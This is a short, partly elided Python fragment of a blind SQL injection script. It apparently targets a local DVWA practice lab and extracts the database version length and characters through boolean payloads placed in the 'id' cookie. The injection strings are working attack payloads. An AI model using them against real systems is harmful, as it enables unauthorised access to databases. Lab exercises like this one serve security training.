...
def get_db_version_len():
    ...
    while True:
        ...
        cookies = {"PHPSESSID":PHPSESSID, "security":SECURITY, "id": f"1' and length(@@VERSION)={version_len}#"}
...
def get_db_ver_char_ascii(digit):
    ...
    while True:
        target_ascii += 1
        url = f"http://localhost/vulnerabilities/sqli_blind/"
        cookies = {"PHPSESSID":PHPSESSID, "security":SECURITY, "id": f"1' and ascii(substr(@@VERSION,{digit},1))={target_ascii}#"}
        response = requests.post(url, cookies=cookies, headers=HEADER)
